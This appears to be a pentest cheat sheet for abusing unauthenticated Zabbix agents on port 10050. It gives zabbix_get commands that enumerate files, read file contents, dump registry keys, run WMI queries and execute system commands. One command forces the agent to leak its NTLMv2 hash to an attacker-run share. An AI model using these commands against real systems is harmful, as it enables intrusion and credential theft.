# Zabbix - Port 10050

Table of Contents
=================

* [Zabbix - Port 10050](#zabbix---port-10050)
* [Table of Contents](#table-of-contents)
   * [What is Zabbix](#what-is-zabbix)
   * [Install](#install)
   * [zabbix_get](#zabbix_get)
      * [vfs.dir.get - Enumerate files in a directory](#vfsdirget---enumerate-files-in-a-directory)
      * [vfs.file.contents - Get the textual content of a file](#vfsfilecontents---get-the-textual-content-of-a-file)
         * [WINDOWS ONLY - Get the NTLMv2 hash of the user running the Zabbix agent](#windows-only---get-the-ntlmv2-hash-of-the-user-running-the-zabbix-agent)
      * [registry.get - Get the list and the content of registry keys](#registryget---get-the-list-and-the-content-of-registry-keys)
         * [List all the keys in a registry path](#list-all-the-keys-in-a-registry-path)
         * [Get the values of a specific key](#get-the-values-of-a-specific-key)
      * [wmi.getall - Execute a WMI query](#wmigetall---execute-a-wmi-query)
      * [system.run - Execute a system command on the target (Not by default)](#systemrun---execute-a-system-command-on-the-target-not-by-default)
      * [Documentation](#documentation)

<!-- Created by https://github.com/ekalinin/github-markdown-toc -->

## What is Zabbix

Zabbix is an open-source software tool to monitor IT infrastructure. By default, an agent is exposed on port **10050** and can be accessed **without any authentication**.


## Install

On a Linux environment, install the following packet:

```bash
sudo apt install zabbix-proxy-mysql
sudo apt install jq # to parse json output
```

## zabbix_get

### vfs.dir.get - Enumerate files in a directory

```bash
# To change the depth of the search, edit the last parameter
zabbix_get -s $IP -k "vfs.dir.get[C:\Users\,,,,,0]" | jq '.[].pathname'
```

### vfs.file.contents - Get the textual content of a file

Only the textual content is returned, binary file such as .exe will not be displayed
```bash
zabbix_get -s $IP -k "vfs.file.contents[C:\Windows\win.ini]"
```

#### WINDOWS ONLY - Get the NTLMv2 hash of the user running the Zabbix agent

Use a responder on the attacker side to capture the hash
```bash
zabbix_get -s $IP -k "vfs.file.contents[\\$LOCAL_IP\<share>\]"
```

### registry.get - Get the list and the content of registry keys

#### List all the keys in a registry path
```bash
zabbix_get -s $IP -k "registry.get[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,keys]"
```

#### Get the values of a specific key
```bash
zabbix_get -s $IP -k "registry.get[HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,values]" 
```

Zabbix supports root abreviation (HKEY_LOCAL_MACHINE -> HKLM)

### wmi.getall - Execute a WMI query
Those WMI queries are made with WQL which is a SQL-like language. Unfortunately, it is not possible to create a new process with this method. However, it is possible to retrieve information about the system, the users, the services, the processes, etc.
```bash
zabbix_get -s $IP -k "wmi.getall[root\cimv2,SELECT * FROM Win32_Process]"
```

### system.run - Execute a system command on the target (Not by default)
This command is not enabled by default, it needs to be enabled in the configuration file of the Zabbix agent. You can view the configuration with the previous commands.
```bash
zabbix_get -s $IP -k "system.run[whoami]"
```


### Documentation

Other interesting keys can be found at the following link : [https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix_agent](https://www.zabbix.com/documentation/current/manual/config/items/itemtypes/zabbix_agent)
